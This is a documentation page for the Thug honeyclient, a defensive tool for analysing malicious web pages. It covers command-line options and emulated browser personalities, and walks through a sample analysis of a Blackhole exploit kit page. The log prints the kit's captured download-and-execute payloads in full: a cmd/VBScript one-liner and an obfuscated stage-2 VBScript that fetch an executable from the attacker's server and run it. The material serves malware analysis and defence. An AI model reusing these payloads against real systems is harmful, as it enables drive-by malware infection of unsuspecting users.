

<!DOCTYPE html>
<html class="writer-html5" lang="en" >
<head>
  <meta charset="utf-8">
  
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  
  <title>Usage &mdash; Thug 1.17 documentation</title>
  

  
  <link rel="stylesheet" href="static/css/theme.css" type="text/css" />
  <link rel="stylesheet" href="static/pygments.css" type="text/css" />

  
  
  
  

  
  <!--[if lt IE 9]>
    <script src="static/js/html5shiv.min.js"></script>
  <![endif]-->
  
    
      <script type="text/javascript" id="documentation_options" data-url_root="./" src="static/documentation_options.js"></script>
        <script src="static/jquery.js"></script>
        <script src="static/underscore.js"></script>
        <script src="static/doctools.js"></script>
        <script src="static/language_data.js"></script>
    
    <script type="text/javascript" src="static/js/theme.js"></script>

    
    <link rel="index" title="Index" href="genindex.html" />
    <link rel="search" title="Search" href="search.html" />
    <link rel="next" title="Thug API" href="api.html" />
    <link rel="prev" title="Configuration" href="configuration.html" /> 
</head>

<body class="wy-body-for-nav">

   
  <div class="wy-grid-for-nav">
    
    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
      <div class="wy-side-scroll">
        <div class="wy-side-nav-search" >
          

          
            <a href="index.html" class="icon icon-home" alt="Documentation Home"> Thug
          

          
          </a>

          
            
            
              <div class="version">
                1.17
              </div>
            
          

          
<div role="search">
  <form id="rtd-search-form" class="wy-form" action="search.html" method="get">
    <input type="text" name="q" placeholder="Search docs" />
    <input type="hidden" name="check_keywords" value="yes" />
    <input type="hidden" name="area" value="default" />
  </form>
</div>

          
        </div>

        
        <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="main navigation">
          
            
            
              
            
            
              <ul class="current">
<li class="toctree-l1"><a class="reference internal" href="intro.html">Introduction</a></li>
<li class="toctree-l1"><a class="reference internal" href="build.html">Build and Install</a></li>
<li class="toctree-l1"><a class="reference internal" href="docker.html">Docker</a></li>
<li class="toctree-l1"><a class="reference internal" href="configuration.html">Configuration</a></li>
<li class="toctree-l1 current"><a class="current reference internal" href="#">Usage</a><ul>
<li class="toctree-l2"><a class="reference internal" href="#basic-usage">Basic usage</a></li>
<li class="toctree-l2"><a class="reference internal" href="#browser-personality">Browser personality</a></li>
<li class="toctree-l2"><a class="reference internal" href="#dom-events-handling">DOM Events Handling</a></li>
<li class="toctree-l2"><a class="reference internal" href="#adobe-acrobat-reader">Adobe Acrobat Reader</a></li>
<li class="toctree-l2"><a class="reference internal" href="#shockwave-flash">Shockwave Flash</a></li>
<li class="toctree-l2"><a class="reference internal" href="#javaplugin-and-javawebstart">JavaPlugin and JavaWebStart</a></li>
<li class="toctree-l2"><a class="reference internal" href="#proxy-support">Proxy support</a></li>
<li class="toctree-l2"><a class="reference internal" href="#image-processing">Image processing</a></li>
<li class="toctree-l2"><a class="reference internal" href="#local-analysis">Local Analysis</a></li>
<li class="toctree-l2"><a class="reference internal" href="#other-useful-features">Other useful features</a></li>
</ul>
</li>
<li class="toctree-l1"><a class="reference internal" href="api.html">Thug API</a></li>
<li class="toctree-l1"><a class="reference internal" href="jshooks.html">JS Hooks</a></li>
<li class="toctree-l1"><a class="reference internal" href="logging.html">Logging</a></li>
<li class="toctree-l1"><a class="reference internal" href="plugins.html">Plugin Framework</a></li>
</ul>

            
          
        </div>
        
      </div>
    </nav>

    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">

      
      <nav class="wy-nav-top" aria-label="top navigation">
        
          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
          <a href="index.html">Thug</a>
        
      </nav>


      <div class="wy-nav-content">
        
        <div class="rst-content">
        
          















<div role="navigation" aria-label="breadcrumbs navigation">

  <ul class="wy-breadcrumbs">
    
      <li><a href="index.html" class="icon icon-home"></a> &raquo;</li>
        
      <li>Usage</li>
    
    
      <li class="wy-breadcrumbs-aside">
        
            
            <a href="sources/usage.rst.txt" rel="nofollow"> View page source</a>
          
        
      </li>
    
  </ul>

  
  <hr/>
</div>
          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
           <div itemprop="articleBody">
            
  <div class="section" id="usage">
<span id="id1"></span><h1>Usage<a class="headerlink" href="#usage" title="Permalink to this headline">¶</a></h1>
<div class="toctree-wrapper compound">
</div>
<div class="section" id="basic-usage">
<h2>Basic usage<a class="headerlink" href="#basic-usage" title="Permalink to this headline">¶</a></h2>
<p>Let’s start our Thug tour by taking a look at the options it provides.</p>
<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>~ $ thug -h

Synopsis:
    Thug: Pure Python honeyclient implementation

Usage:
    thug <span class="o">[</span> options <span class="o">]</span> url

Options:
    -h, --help                      Display this <span class="nb">help</span> information
    -V, --version                   Display Thug version
    -i, --list-ua                   Display available user agents
    -u, --useragent<span class="o">=</span>                Select a user agent <span class="o">(</span>use option -b <span class="k">for</span> values, default: winxpie60<span class="o">)</span>
    -e, --events<span class="o">=</span>                   Enable comma-separated specified DOM events handling
    -w, --delay<span class="o">=</span>                    Set a maximum setTimeout/setInterval delay value <span class="o">(</span>in milliseconds<span class="o">)</span>
    -n, --logdir<span class="o">=</span>                   Set the log output directory
    -o, --output<span class="o">=</span>                   Log to a specified file
    -r, --referer                   Specify a referer
    -p, --proxy<span class="o">=</span>                    Specify a proxy <span class="o">(</span>see below <span class="k">for</span> format and supported schemes<span class="o">)</span>
    -m, --attachment                Set the attachment mode
    -l, --local                     Analyze a locally saved page
    -x, --local-nofetch             Analyze a locally saved page and prevent remote content fetching
    -v, --verbose                   Enable verbose mode
    -d, --debug                     Enable debug mode
    -q, --quiet                     Disable console logging
    -g, --http-debug                Enable HTTP debug mode
    -t, --threshold                 Maximum pages to fetch
    -j, --extensive                 Extensive fetch of linked pages
    -O, --connect-timeout           Set the connect timeout <span class="o">(</span>in seconds, default: <span class="m">10</span> seconds<span class="o">)</span>
    -T, --timeout<span class="o">=</span>                  Set the analysis timeout <span class="o">(</span>in seconds, default: <span class="m">600</span> seconds<span class="o">)</span>
    -c, --broken-url                Set the broken URL mode
    -y, --vtquery                   Query VirusTotal <span class="k">for</span> samples analysis
    -s, --vtsubmit                  Submit samples to VirusTotal
    -b, --vt-apikey<span class="o">=</span>                VirusTotal API key to be used at runtime
    -z, --web-tracking              Enable web client tracking inspection
    -k, --no-honeyagent             Disable HoneyAgent support
    -a, --image-processing          Enable image processing analysis
    -E, --awis                      Enable AWS Alexa Web Information Service <span class="o">(</span>AWIS<span class="o">)</span>

    Plugins:
    -A, --adobepdf<span class="o">=</span>                 Specify the Adobe Acrobat Reader version <span class="o">(</span>default: <span class="m">9</span>.1.0<span class="o">)</span>
    -P, --no-adobepdf               Disable Adobe Acrobat Reader plugin
    -S, --shockwave<span class="o">=</span>                Specify the Shockwave Flash version <span class="o">(</span>default: <span class="m">10</span>.0.64.0<span class="o">)</span>
    -R, --no-shockwave              Disable Shockwave Flash plugin
    -J, --javaplugin<span class="o">=</span>               Specify the JavaPlugin version <span class="o">(</span>default: <span class="m">1</span>.6.0.32<span class="o">)</span>
    -K, --no-javaplugin             Disable Java plugin
    -L, --silverlight               Specify SilverLight version <span class="o">(</span>default: <span class="m">4</span>.0.50826.0<span class="o">)</span>
    -N, --no-silverlight            Disable SilverLight plugin

    Classifiers:
    --htmlclassifier<span class="o">=</span>               Specify a list of additional <span class="o">(</span>comma separated<span class="o">)</span> HTML classifier rule files
    --urlclassifier<span class="o">=</span>                Specify a list of additional <span class="o">(</span>comma separated<span class="o">)</span> URL classifier rule files
    --jsclassifier<span class="o">=</span>                 Specify a list of additional <span class="o">(</span>comma separated<span class="o">)</span> JS classifier rule files
    --vbsclassifier<span class="o">=</span>                Specify a list of additional <span class="o">(</span>comma separated<span class="o">)</span> VBS classifier rule files
    --sampleclassifier<span class="o">=</span>             Specify a list of additional <span class="o">(</span>comma separated<span class="o">)</span> sample classifier rule files
    --htmlfilter<span class="o">=</span>                   Specify a list of additional <span class="o">(</span>comma separated<span class="o">)</span> HTML filter files
    --urlfilter<span class="o">=</span>                    Specify a list of additional <span class="o">(</span>comma separated<span class="o">)</span> URL filter files
    --jsfilter<span class="o">=</span>                     Specify a list of additional <span class="o">(</span>comma separated<span class="o">)</span> JS filter files
    --vbsfilter<span class="o">=</span>                    Specify a list of additional <span class="o">(</span>comma separated<span class="o">)</span> VBS filter files
    --samplefilter<span class="o">=</span>                 Specify a list of additional <span class="o">(</span>comma separated<span class="o">)</span> sample filter files

    Logging:
    -F, --file-logging              Enable file logging mode <span class="o">(</span>default: disabled<span class="o">)</span>
    -Z, --json-logging              Enable JSON logging mode <span class="o">(</span>default: disabled<span class="o">)</span>
    -G, --elasticsearch-logging     Enable ElasticSearch logging mode <span class="o">(</span>default: disabled<span class="o">)</span>
    -D, --mongodb-address<span class="o">=</span>          Specify address and port of the MongoDB instance <span class="o">(</span>format: host:port<span class="o">)</span>
    -Y, --no-code-logging           Disable code logging
    -U, --no-cert-logging           Disable SSL/TLS certificate logging

Proxy Format:
    scheme://<span class="o">[</span>username:password@<span class="o">]</span>host:port <span class="o">(</span>supported schemes: http, socks4, socks5<span class="o">)</span>
</pre></div>
</div>
<p>Before diving deep into details let’s take a look at the available personalities</p>
<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>$ thug --list-ua

Synopsis:
    Thug: Pure Python honeyclient implementation

Available User-Agents:
            winxpie60             Internet Explorer <span class="m">6</span>.0     <span class="o">(</span>Windows XP<span class="o">)</span>
            winxpie61             Internet Explorer <span class="m">6</span>.1     <span class="o">(</span>Windows XP<span class="o">)</span>
            winxpie70             Internet Explorer <span class="m">7</span>.0     <span class="o">(</span>Windows XP<span class="o">)</span>
            winxpie80             Internet Explorer <span class="m">8</span>.0     <span class="o">(</span>Windows XP<span class="o">)</span>
            winxpchrome20         Chrome <span class="m">20</span>.0.1132.47       <span class="o">(</span>Windows XP<span class="o">)</span>
            winxpfirefox12        Firefox <span class="m">12</span>.0              <span class="o">(</span>Windows XP<span class="o">)</span>
            winxpsafari5          Safari <span class="m">5</span>.1.7              <span class="o">(</span>Windows XP<span class="o">)</span>
            win2kie60             Internet Explorer <span class="m">6</span>.0     <span class="o">(</span>Windows <span class="m">2000</span><span class="o">)</span>
            win2kie80             Internet Explorer <span class="m">8</span>.0     <span class="o">(</span>Windows <span class="m">2000</span><span class="o">)</span>
            win7ie80              Internet Explorer <span class="m">8</span>.0     <span class="o">(</span>Windows <span class="m">7</span><span class="o">)</span>
            win7ie90              Internet Explorer <span class="m">9</span>.0     <span class="o">(</span>Windows <span class="m">7</span><span class="o">)</span>
            win7ie100             Internet Explorer <span class="m">10</span>.0    <span class="o">(</span>Windows <span class="m">7</span><span class="o">)</span>
            win7chrome20          Chrome <span class="m">20</span>.0.1132.47       <span class="o">(</span>Windows <span class="m">7</span><span class="o">)</span>
            win7chrome40          Chrome <span class="m">40</span>.0.2214.91       <span class="o">(</span>Windows <span class="m">7</span><span class="o">)</span>
            win7chrome45          Chrome <span class="m">45</span>.0.2454.85       <span class="o">(</span>Windows <span class="m">7</span><span class="o">)</span>
            win7chrome49          Chrome <span class="m">49</span>.0.2623.87       <span class="o">(</span>Windows <span class="m">7</span><span class="o">)</span>
            win7firefox3          Firefox <span class="m">3</span>.6.13            <span class="o">(</span>Windows <span class="m">7</span><span class="o">)</span>
            win7safari5           Safari <span class="m">5</span>.1.7              <span class="o">(</span>Windows <span class="m">7</span><span class="o">)</span>
            win10ie110            Internet Explorer <span class="m">11</span>.0    <span class="o">(</span>Windows <span class="m">10</span><span class="o">)</span>
            osx10chrome19         Chrome <span class="m">19</span>.0.1084.54       <span class="o">(</span>MacOS X <span class="m">10</span>.7.4<span class="o">)</span>
            osx10chrome80         Chrome <span class="m">80</span>.0.3987.116      <span class="o">(</span>MacOS X <span class="m">10</span>.15.3<span class="o">)</span>
            osx10safari5          Safari <span class="m">5</span>.1.1              <span class="o">(</span>MacOS X <span class="m">10</span>.7.2<span class="o">)</span>
            linuxchrome26         Chrome <span class="m">26</span>.0.1410.19       <span class="o">(</span>Linux<span class="o">)</span>
            linuxchrome30         Chrome <span class="m">30</span>.0.1599.15       <span class="o">(</span>Linux<span class="o">)</span>
            linuxchrome44         Chrome <span class="m">44</span>.0.2403.89       <span class="o">(</span>Linux<span class="o">)</span>
            linuxchrome54         Chrome <span class="m">54</span>.0.2840.100      <span class="o">(</span>Linux<span class="o">)</span>
            linuxfirefox19        Firefox <span class="m">19</span>.0              <span class="o">(</span>Linux<span class="o">)</span>
            linuxfirefox40        Firefox <span class="m">40</span>.0              <span class="o">(</span>Linux<span class="o">)</span>
            galaxy2chrome18       Chrome <span class="m">18</span>.0.1025.166      <span class="o">(</span>Samsung Galaxy S II, Android <span class="m">4</span>.0.3<span class="o">)</span>
            galaxy2chrome25       Chrome <span class="m">25</span>.0.1364.123      <span class="o">(</span>Samsung Galaxy S II, Android <span class="m">4</span>.0.3<span class="o">)</span>
            galaxy2chrome29       Chrome <span class="m">29</span>.0.1547.59       <span class="o">(</span>Samsung Galaxy S II, Android <span class="m">4</span>.1.2<span class="o">)</span>
            nexuschrome18         Chrome <span class="m">18</span>.0.1025.133      <span class="o">(</span>Google Nexus, Android <span class="m">4</span>.0.4<span class="o">)</span>
            ipadchrome33          Chrome <span class="m">33</span>.0.1750.21       <span class="o">(</span>iPad, iOS <span class="m">7</span>.1<span class="o">)</span>
            ipadchrome35          Chrome <span class="m">35</span>.0.1916.41       <span class="o">(</span>iPad, iOS <span class="m">7</span>.1.1<span class="o">)</span>
            ipadchrome37          Chrome <span class="m">37</span>.0.2062.52       <span class="o">(</span>iPad, iOS <span class="m">7</span>.1.2<span class="o">)</span>
            ipadchrome38          Chrome <span class="m">38</span>.0.2125.59       <span class="o">(</span>iPad, iOS <span class="m">8</span>.0.2<span class="o">)</span>
            ipadchrome39          Chrome <span class="m">39</span>.0.2171.45       <span class="o">(</span>iPad, iOS <span class="m">8</span>.1.1<span class="o">)</span>
            ipadchrome45          Chrome <span class="m">45</span>.0.2454.68       <span class="o">(</span>iPad, iOS <span class="m">8</span>.4.1<span class="o">)</span>
            ipadchrome46          Chrome <span class="m">46</span>.0.2490.73       <span class="o">(</span>iPad, iOS <span class="m">9</span>.0.2<span class="o">)</span>
            ipadchrome47          Chrome <span class="m">47</span>.0.2526.70       <span class="o">(</span>iPad, iOS <span class="m">9</span>.1<span class="o">)</span>
            ipadsafari7           Safari <span class="m">7</span>.0                <span class="o">(</span>iPad, iOS <span class="m">7</span>.0.4<span class="o">)</span>
            ipadsafari8           Safari <span class="m">8</span>.0                <span class="o">(</span>iPad, iOS <span class="m">8</span>.0.2<span class="o">)</span>
            ipadsafari9           Safari <span class="m">9</span>.0                <span class="o">(</span>iPad, iOS <span class="m">9</span>.1<span class="o">)</span>
</pre></div>
</div>
<p>Let’s start with a first basic real-world example: a Blackhole exploit kit.</p>
<div class="highlight-sh notranslate"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70</pre></div></td><td class="code"><div class="highlight"><pre><span></span>       ~ $ thug <span class="s2">&quot;http://[omitted]/main.php?page=8c6c59becaa0da07&quot;</span>
       <span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:15:20<span class="o">]</span> <span class="o">[</span>HTTP<span class="o">]</span> URL: http://<span class="o">[</span>omitted<span class="o">]</span>/main.php?page<span class="o">=</span>8c6c59becaa0da07 <span class="o">(</span>Status: <span class="m">200</span>, Referrer: None<span class="o">)</span>
       <span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:15:20<span class="o">]</span> &lt;applet <span class="nv">archive</span><span class="o">=</span><span class="s2">&quot;Ryp.jar&quot;</span> <span class="nv">code</span><span class="o">=</span><span class="s2">&quot;sIda.sIda&quot;</span>&gt;&lt;param <span class="nv">name</span><span class="o">=</span><span class="s2">&quot;b&quot;</span> <span class="nv">value</span><span class="o">=</span><span class="s2">&quot;56:14:14:19:27:50:50:6:56:47:66:47:33:19:22:48:11:33:49:66:11:14:50:48:49:19:56:19:46:67:24:0:12:1:60:61:70:11:24:12&quot;</span>&gt;&lt;/param&gt;&lt;/applet&gt;
       <span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:15:20<span class="o">]</span> <span class="o">[</span>Navigator URL Translation<span class="o">]</span> Ryp.jar --&gt;  http://<span class="o">[</span>omitted<span class="o">]</span>/Ryp.jar
       <span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:15:22<span class="o">]</span> <span class="o">[</span>HTTP<span class="o">]</span> URL: http://<span class="o">[</span>omitted<span class="o">]</span>/Ryp.jar <span class="o">(</span>Status: <span class="m">200</span>, Referrer: http://<span class="o">[</span>omitted<span class="o">]</span>/main.php?page<span class="o">=</span>8c6c59becaa0da07<span class="o">)</span>
       <span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:15:23<span class="o">]</span> Saving applet Ryp.jar
       <span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:15:24<span class="o">]</span> ActiveXObject: msxml2.xmlhttp
       <span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:15:24<span class="o">]</span> ActiveXObject: acropdf.pdf
       <span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:15:24<span class="o">]</span> Unknown ActiveX Object: shockwaveflash.shockwaveflash.15
       <span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:15:24<span class="o">]</span> Unknown ActiveX Object: shockwaveflash.shockwaveflash.14
       <span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:15:24<span class="o">]</span> Unknown ActiveX Object: shockwaveflash.shockwaveflash.13
       <span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:15:24<span class="o">]</span> Unknown ActiveX Object: shockwaveflash.shockwaveflash.12
       <span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:15:24<span class="o">]</span> Unknown ActiveX Object: shockwaveflash.shockwaveflash.11
       <span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:15:24<span class="o">]</span> ActiveXObject: shockwaveflash.shockwaveflash.10
       <span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:15:24<span class="o">]</span> <span class="o">[</span>Microsoft MDAC RDS.Dataspace ActiveX<span class="o">]</span> CreateObject <span class="o">(</span>adodb.stream<span class="o">)</span>
       <span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:15:24<span class="o">]</span> ActiveXObject: adodb.stream
       <span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:15:24<span class="o">]</span> <span class="o">[</span>Microsoft MDAC RDS.Dataspace ActiveX<span class="o">]</span> CreateObject <span class="o">(</span>Shell.Application<span class="o">)</span>
       <span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:15:24<span class="o">]</span> ActiveXObject: shell.application
       <span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:15:24<span class="o">]</span> <span class="o">[</span>Microsoft MDAC RDS.Dataspace ActiveX<span class="o">]</span> CreateObject <span class="o">(</span>msxml2.XMLHTTP<span class="o">)</span>
       <span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:15:24<span class="o">]</span> ActiveXObject: msxml2.xmlhttp
       <span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:15:24<span class="o">]</span> <span class="o">[</span>Microsoft XMLHTTP ActiveX<span class="o">]</span> Fetching from URL http://<span class="o">[</span>omitted<span class="o">]</span>/w.php?f<span class="o">=</span>b081d<span class="p">&amp;</span><span class="nv">e</span><span class="o">=</span><span class="m">2</span>
       <span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:15:27<span class="o">]</span> <span class="o">[</span>HTTP<span class="o">]</span> URL: http://<span class="o">[</span>omitted<span class="o">]</span>/w.php?f<span class="o">=</span>b081d<span class="p">&amp;</span><span class="nv">e</span><span class="o">=</span><span class="m">2</span> <span class="o">(</span>Status: <span class="m">200</span>, Referrer: http://<span class="o">[</span>omitted<span class="o">]</span>/main.php?page<span class="o">=</span>8c6c59becaa0da07<span class="o">)</span>
       <span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:15:29<span class="o">]</span> <span class="o">[</span>Microsoft XMLHTTP ActiveX<span class="o">]</span> Saving File: d328b5a123bce1c0d20d763ad745303a
       <span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:15:29<span class="o">]</span> <span class="o">[</span>Microsoft XMLHTTP ActiveX<span class="o">]</span> send
       <span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:15:29<span class="o">]</span> <span class="o">[</span>Adodb.Stream ActiveX<span class="o">]</span> open
       <span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:15:29<span class="o">]</span> <span class="o">[</span>Adodb.Stream ActiveX<span class="o">]</span> Write
       <span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:15:29<span class="o">]</span> <span class="o">[</span>Adodb.Stream ActiveX<span class="o">]</span> SaveToFile <span class="o">(</span>.//..//a2ffcd1.exe<span class="o">)</span>
       <span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:15:29<span class="o">]</span> <span class="o">[</span>Adodb.Stream ActiveX<span class="o">]</span> Close
       <span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:15:29<span class="o">]</span> <span class="o">[</span>Shell.Application ActiveX<span class="o">]</span> ShellExecute command: .//..//a2ffcd1.exe
       <span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:15:29<span class="o">]</span> <span class="o">[</span>Navigator URL Translation<span class="o">]</span> ./data/ap1.php?f<span class="o">=</span>b081d --&gt;  http://<span class="o">[</span>omitted<span class="o">]</span>/data/ap1.php?f<span class="o">=</span>b081d
       <span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:15:36<span class="o">]</span> <span class="o">[</span>HTTP<span class="o">]</span> URL: http://<span class="o">[</span>omitted<span class="o">]</span>/data/ap1.php?f<span class="o">=</span>b081d <span class="o">(</span>Status: <span class="m">200</span>, Referrer: http://<span class="o">[</span>omitted<span class="o">]</span>/main.php?page<span class="o">=</span>8c6c59becaa0da07<span class="o">)</span>
       <span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:15:36<span class="o">]</span> Microsoft Internet Explorer HCP Scheme Detected
       <span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:15:36<span class="o">]</span> Microsoft Windows Help Center Malformed Escape Sequences Incorrect Handling
       <span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:15:36<span class="o">]</span> <span class="o">[</span>AST<span class="o">]</span>: Eval argument length &gt; <span class="m">64</span>
       <span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:15:36<span class="o">]</span> <span class="o">[</span>Windows Script Host Run<span class="o">]</span> Command:
       cmd /c <span class="nb">echo</span> <span class="nv">B</span><span class="o">=</span><span class="s2">&quot;l.vbs&quot;</span>:With CreateObject<span class="o">(</span><span class="s2">&quot;MSXML2.XMLHTTP&quot;</span><span class="o">)</span>:.open <span class="s2">&quot;GET&quot;</span>,<span class="s2">&quot;http://[omitted]/data/hcp_vbs.php?f=b081d&amp;d=0&quot;</span>,false:.send<span class="o">()</span>:Set <span class="nv">A</span> <span class="o">=</span> CreateObject<span class="o">(</span><span class="s2">&quot;Scripting.FileSystemObject&quot;</span><span class="o">)</span>:Set <span class="nv">D</span><span class="o">=</span>A.CreateTextFile<span class="o">(</span>A.GetSpecialFolder<span class="o">(</span><span class="m">2</span><span class="o">)</span> + <span class="s2">&quot;\&quot; + B):D.WriteLine .responseText:End With:D.Close:CreateObject(&quot;</span>WScript.Shell<span class="s2">&quot;).Run A.GetSpecialFolder(2) + &quot;</span><span class="se">\&quot;</span> + B &gt; %TEMP%<span class="se">\\</span>l.vbs <span class="o">&amp;&amp;</span> %TEMP%<span class="se">\\</span>l.vbs <span class="o">&amp;&amp;</span> taskkill /F /IM helpctr.exe

       <span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:15:36<span class="o">]</span> <span class="o">[</span>Windows Script Host Run - Stage <span class="m">1</span><span class="o">]</span> Code:
       cmd /c <span class="nb">echo</span> <span class="nv">B</span><span class="o">=</span><span class="s2">&quot;l.vbs&quot;</span>:With CreateObject<span class="o">(</span><span class="s2">&quot;MSXML2.XMLHTTP&quot;</span><span class="o">)</span>:.open <span class="s2">&quot;GET&quot;</span>,<span class="s2">&quot;http://[omitted]/data/hcp_vbs.php?f=b081d&amp;d=0&quot;</span>,false:.send<span class="o">()</span>:Set <span class="nv">A</span> <span class="o">=</span> CreateObject<span class="o">(</span><span class="s2">&quot;Scripting.FileSystemObject&quot;</span><span class="o">)</span>:Set <span class="nv">D</span><span class="o">=</span>A.CreateTextFile<span class="o">(</span>A.GetSpecialFolder<span class="o">(</span><span class="m">2</span><span class="o">)</span> + <span class="s2">&quot;\&quot; + B):D.WriteLine .responseText:End With:D.Close:CreateObject(&quot;</span>WScript.Shell<span class="s2">&quot;).Run A.GetSpecialFolder(2) + &quot;</span><span class="se">\&quot;</span> + B &gt; %TEMP%<span class="se">\\</span>l.vbs <span class="o">&amp;&amp;</span> %TEMP%<span class="se">\\</span>l.vbs <span class="o">&amp;&amp;</span> taskkill /F /IM helpctr.exe
       <span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:15:36<span class="o">]</span> <span class="o">[</span>Windows Script Host Run - Stage <span class="m">1</span><span class="o">]</span> Downloading from URL http://<span class="o">[</span>omitted<span class="o">]</span>/data/hcp_vbs.php?f<span class="o">=</span>b081d<span class="p">&amp;</span><span class="nv">d</span><span class="o">=</span><span class="m">0</span>
       <span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:15:37<span class="o">]</span> <span class="o">[</span>HTTP<span class="o">]</span> URL: http://<span class="o">[</span>omitted<span class="o">]</span>/data/hcp_vbs.php?f<span class="o">=</span>b081d<span class="p">&amp;</span><span class="nv">d</span><span class="o">=</span><span class="m">0</span> <span class="o">(</span>Status: <span class="m">200</span>, Referrer: http://<span class="o">[</span>omitted<span class="o">]</span>/main.php?page<span class="o">=</span>8c6c59becaa0da07<span class="o">)</span>
       <span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:15:37<span class="o">]</span> <span class="o">[</span>Windows Script Host Run - Stage <span class="m">1</span><span class="o">]</span> Saving file d26b9b1a1f667004945d1d000cf4f19e
       <span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:15:37<span class="o">]</span> <span class="o">[</span>Windows Script Host Run - Stage <span class="m">2</span><span class="o">]</span> Code:
       <span class="nv">w</span><span class="o">=</span><span class="m">3000</span>:x<span class="o">=</span><span class="m">200</span>:y<span class="o">=</span><span class="m">1</span>:z<span class="o">=</span>false:a <span class="o">=</span> <span class="s2">&quot;http://[omitted]/w.php?e=5&amp;f=b081d&quot;</span>:Set <span class="nv">e</span> <span class="o">=</span> Createobject<span class="o">(</span>StrReverse<span class="o">(</span><span class="s2">&quot;tcejbOmetsySeliF.gnitpircS&quot;</span><span class="o">))</span>:Set <span class="nv">f</span><span class="o">=</span>e.GetSpecialFolder<span class="o">(</span><span class="m">2</span><span class="o">)</span>:b <span class="o">=</span> f <span class="p">&amp;</span> <span class="s2">&quot;\exe.ex2&quot;</span>:b<span class="o">=</span>Replace<span class="o">(</span>b,Month<span class="o">(</span><span class="s2">&quot;2010-02-16&quot;</span><span class="o">)</span>,<span class="s2">&quot;e&quot;</span><span class="o">)</span>:OT <span class="o">=</span> <span class="s2">&quot;GET&quot;</span>:Set <span class="nv">c</span> <span class="o">=</span> CreateObject<span class="o">(</span>StrReverse<span class="o">(</span><span class="s2">&quot;PTTHLMX.2LMXSM&quot;</span><span class="o">))</span>:Set <span class="nv">d</span> <span class="o">=</span> CreateObject<span class="o">(</span>StrReverse<span class="o">(</span><span class="s2">&quot;ertS.BDODA&quot;</span><span class="o">)</span> <span class="p">&amp;</span> <span class="s2">&quot;am&quot;</span><span class="o">)</span>
       Set <span class="nv">o</span><span class="o">=</span>Createobject<span class="o">(</span>StrReverse<span class="o">(</span><span class="s2">&quot;tcejbOmetsySeliF.gnitpircS&quot;</span><span class="o">))</span>
       On Error resume next
       c.open OT, a, z:c.send<span class="o">()</span>
       If c.Status <span class="o">=</span> x Then
       d.Open:d.Type <span class="o">=</span> y:d.Write c.ResponseBody:d.SaveToFile b:d.Close
       End If
       Set <span class="nv">w</span><span class="o">=</span>CreateObject<span class="o">(</span>StrReverse<span class="o">(</span><span class="s2">&quot;llehS.&quot;</span> <span class="p">&amp;</span> <span class="s2">&quot;tpi&quot;</span><span class="p">&amp;</span><span class="s2">&quot;rcSW&quot;</span><span class="o">))</span>
       Eval<span class="o">(</span>Replace<span class="o">(</span><span class="s2">&quot;W.ex2c b&quot;</span>, Month<span class="o">(</span><span class="s2">&quot;2010-02-16&quot;</span><span class="o">)</span>, <span class="s2">&quot;E&quot;</span><span class="o">))</span>
